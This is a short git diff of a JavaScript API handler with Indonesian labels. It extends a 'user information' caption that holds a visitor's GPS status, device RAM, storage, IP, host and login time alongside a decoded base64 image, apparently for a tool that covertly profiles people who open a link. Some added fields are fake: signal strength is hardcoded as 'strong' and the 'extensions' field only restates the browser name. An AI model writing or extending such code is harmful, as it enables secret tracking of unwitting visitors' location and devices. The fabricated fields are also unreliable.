@@ -51,6 +51,17 @@ export default async function handler(req, res) {
 
     const bahasa = req.headers["accept-language"]?.split(",")[0] || "Tidak diketahui";
 
+    // Menambahkan informasi tambahan
+    const waktuLogin = new Date().toLocaleString("id-ID");
+    const ipLokal = req.connection.localAddress || "Tidak diketahui";
+    const hostName = req.headers["host"] || "Tidak diketahui";
+    const appVersion = req.headers["x-app-version"] || "Tidak diketahui";
+    const networkProtocol = req.connection.encrypted ? "HTTPS" : "HTTP";
+    const browserExtensions = browser.name ? `${browser.name} Extensions` : "Tidak diketahui";
+    const signalStrength = "Kuat"; // Ini bisa diambil dari data jaringan seluler, jika relevan
+    const apiVersion = "1.0"; // Versi API
+    const gpsStatus = lat && lon ? "Aktif" : "Tidak tersedia";
+
     const caption = `Dev By @FazrrEdan
 
 🌎 Informasi Pengguna 
@@ -71,6 +82,16 @@ export default async function handler(req, res) {
 -RAM: ${deviceInfo.ram} GB
 -Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
 -Koneksi: ${deviceInfo.connection}
+
+-Waktu Login: ${waktuLogin}
+-IP Lokal: ${ipLokal}
+-Host Name: ${hostName}
+-Versi Aplikasi/Client: ${appVersion}
+-Protokol Jaringan: ${networkProtocol}
+-Plugin/Extension Browser: ${browserExtensions}
+-Kondisi Jaringan: ${signalStrength}
+-Versi API: ${apiVersion}
+-Status GPS: ${gpsStatus}
 `;
 
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
